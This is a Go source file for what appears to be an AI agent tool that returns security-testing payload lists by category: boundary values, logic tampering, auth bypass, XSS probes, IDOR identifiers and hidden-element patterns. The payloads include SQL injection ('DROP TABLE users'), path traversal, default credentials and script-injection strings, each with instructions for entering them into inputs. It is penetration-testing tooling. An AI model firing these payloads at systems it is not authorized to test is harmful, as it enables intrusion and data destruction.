package adk

import (
	"fmt"
	"strings"

	"google.golang.org/adk/tool"
	"google.golang.org/adk/tool/functiontool"
)

type payloadArgs struct {
	Category string `json:"category" jsonschema:"The vulnerability category to generate payloads for. One of: boundary, logic, auth, xss, idor, hidden_element"`
	Context  string `json:"context,omitempty" jsonschema:"Optional context about the target field or endpoint to tailor payloads"`
}

type payloadResult struct {
	Category    string   `json:"category"`
	Payloads    []string `json:"payloads"`
	Description string   `json:"description"`
	Usage       string   `json:"usage"`
}

var payloadSets = map[string]payloadResult{
	"boundary": {
		Category: "boundary",
		Payloads: []string{
			"0",
			"-1",
			"-999999",
			"999999999",
			"2147483647",
			"-2147483648",
			"0.01",
			"-0.01",
			"0.001",
			"99999.99",
			"",
			" ",
			"null",
			"undefined",
			"NaN",
			"Infinity",
			"-Infinity",
			strings.Repeat("A", 1000),
			strings.Repeat("A", 10000),
			"1e308",
			"1e-308",
		},
		Description: "Boundary value payloads for numeric and string fields. Tests integer overflow, underflow, float precision, empty values, and buffer limits.",
		Usage:       "Type each payload into form fields, quantity inputs, price fields, or any numeric/text input. Observe if the application handles them gracefully or exposes errors.",
	},
	"logic": {
		Category: "logic",
		Payloads: []string{
			"-1",
			"0",
			"0.001",
			"-0.01",
			"99999",
			"1; DROP TABLE users--",
			"{{7*7}}",
			"${7*7}",
			"true",
			"false",
			"[]",
			"{}",
			"admin",
			"role=admin",
			"isAdmin=true",
			"discount=100",
			"price=0",
			"quantity=-1",
			"total=0.01",
			"skip_validation=true",
		},
		Description: "Business logic manipulation payloads. Tests for client-side trust issues, parameter tampering, and workflow bypass.",
		Usage:       "Use in form fields, URL parameters, and hidden fields. Pay attention to price calculations, role assignments, and validation bypasses.",
	},
	"auth": {
		Category: "auth",
		Payloads: []string{
			"",
			"null",
			"undefined",
			"Bearer ",
			"Bearer null",
			"Bearer undefined",
			"admin",
			"root",
			"test",
			"guest",
			"user_id=1",
			"user_id=0",
			"user_id=-1",
			"role=admin",
			"is_admin=1",
			"../",
			"..%2F",
			"%00",
		},
		Description: "Authentication and authorization bypass payloads. Tests for missing auth checks, default credentials, and path traversal.",
		Usage:       "Use as authorization header values, cookie values, or URL path segments. Test if endpoints are accessible without valid credentials.",
	},
	"xss": {
		Category: "xss",
		Payloads: []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"javascript:alert(1)",
			"\" onmouseover=\"alert(1)\"",
			"'><script>alert(1)</script>",
			"<iframe src=\"javascript:alert(1)\">",
			"{{constructor.constructor('alert(1)')()}}",
			"${alert(1)}",
			"<details open ontoggle=alert(1)>",
			"<body onload=alert(1)>",
			"<input onfocus=alert(1) autofocus>",
		},
		Description: "Cross-site scripting probes to test input sanitization. Not for exploitation -- used to verify if the application properly encodes or rejects HTML/JS input.",
		Usage:       "Type into search boxes, comment fields, profile names, and any user-input field. Check if the payload is rendered, encoded, or stripped.",
	},
	"idor": {
		Category: "idor",
		Payloads: []string{
			"1",
			"2",
			"0",
			"-1",
			"999",
			"1000",
			"admin",
			"test",
			"user",
			"../1",
			"1%00",
			"1;",
			"1'",
			"1\"",
			"00000000-0000-0000-0000-000000000001",
			"00000000-0000-0000-0000-000000000000",
		},
		Description: "Insecure Direct Object Reference payloads. Tests if changing resource identifiers grants access to other users' data.",
		Usage:       "Replace user IDs, resource IDs, or document IDs in URLs and API requests. Compare responses between different ID values.",
	},
	"hidden_element": {
		Category: "hidden_element",
		Payloads: []string{
			"display:none",
			"visibility:hidden",
			"opacity:0",
			"position:absolute;left:-9999px",
			"height:0;overflow:hidden",
			"type=\"hidden\"",
			"disabled",
			"aria-hidden=\"true\"",
			"data-testid",
			"data-debug",
			"data-admin",
			"<!--",
			"console.log",
			"debugger",
			"/admin",
			"/debug",
			"/test",
			"/api/",
			"__NEXT_DATA__",
			"window.__",
		},
		Description: "CSS selectors and patterns to search for in HTML source that indicate hidden UI elements, debug functionality, or leaked configuration.",
		Usage:       "Use with the browse tool (include_html=true) and search the returned HTML for these patterns. Hidden elements may reveal admin panels, debug tools, or sensitive configuration.",
	},
}

func generatePayloads(_ tool.Context, args payloadArgs) (payloadResult, error) {
	category := strings.ToLower(strings.TrimSpace(args.Category))

	result, ok := payloadSets[category]
	if !ok {
		available := make([]string, 0, len(payloadSets))
		for k := range payloadSets {
			available = append(available, k)
		}
		return payloadResult{}, fmt.Errorf("unknown category %q, available: %s", category, strings.Join(available, ", "))
	}

	if args.Context != "" {
		result.Usage = fmt.Sprintf("%s\n\nTarget context: %s", result.Usage, args.Context)
	}

	return result, nil
}

// NewPayloadTool creates an ADK tool that generates security testing payloads.
func NewPayloadTool() (tool.Tool, error) {
	return functiontool.New(
		functiontool.Config{
			Name:        "payload",
			Description: "Generate security testing payloads for a given vulnerability category. Categories: boundary (numeric/string limits), logic (business logic manipulation), auth (authentication bypass), xss (input sanitization probes), idor (object reference testing), hidden_element (CSS/HTML patterns to find hidden UI).",
		},
		generatePayloads,
	)
}
